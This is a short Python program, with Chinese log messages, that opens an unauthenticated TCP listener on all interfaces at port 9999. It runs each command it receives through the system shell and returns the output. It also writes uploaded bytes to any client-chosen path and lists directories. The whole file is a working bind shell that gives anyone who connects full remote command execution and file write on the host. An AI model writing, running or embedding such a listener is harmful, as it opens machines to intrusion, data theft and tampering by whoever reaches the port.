import os
import socket
import subprocess
import threading

import chardet


def execute_command(command):
    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        encoding = chardet.detect(output)['encoding']
        return output.decode(encoding, errors='replace')
    except subprocess.CalledProcessError as e:
        encoding = chardet.detect(e.output)['encoding']
        return e.output.decode(encoding, errors='replace')


def receive_file(client_socket, filename):
    if filename:
        directory = os.path.dirname(filename)
        if directory and not os.path.exists(directory):
            os.makedirs(directory)
    with open(filename, 'wb') as f:
        while True:
            data = client_socket.recv(1024)
            if data.endswith(b'DONE'):
                f.write(data[:-4])
                break
            f.write(data)
    print(f"文件 {filename} 上传完成。")


def browse_filesystem(directory):
    try:
        files = os.listdir(directory)
        return "\n".join(files)
    except FileNotFoundError:
        return f"Directory not found: {directory}"
    except PermissionError:
        return f"Permission denied: {directory}"
    except Exception as e:
        return str(e)


def handle_client(client_socket, client_address):
    print(f"连接来自 {client_address}")
    with client_socket:
        while True:
            command = client_socket.recv(1024).decode('utf-8')
            if not command:
                break
            print(f"收到命令: {command}")
            if command.startswith('upload'):
                _, filename = command.split()
                receive_file(client_socket, filename)
            elif command.startswith('browse'):
                _, directory = command.split(maxsplit=1)
                output = browse_filesystem(directory)
                client_socket.sendall(output.encode('utf-8'))
            else:
                output = execute_command(command)
                client_socket.sendall(output.encode('utf-8'))
    print(f"客户端 {client_address} 断开连接。")


def main():
    host = '0.0.0.0'
    port = 9999

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
        server_socket.bind((host, port))
        server_socket.listen(5)
        print(f"服务器正在监听 {host}:{port}...")

        while True:
            client_socket, client_address = server_socket.accept()
            client_thread = threading.Thread(target=handle_client, args=(client_socket, client_address))
            client_thread.start()


if __name__ == "__main__":
    main()
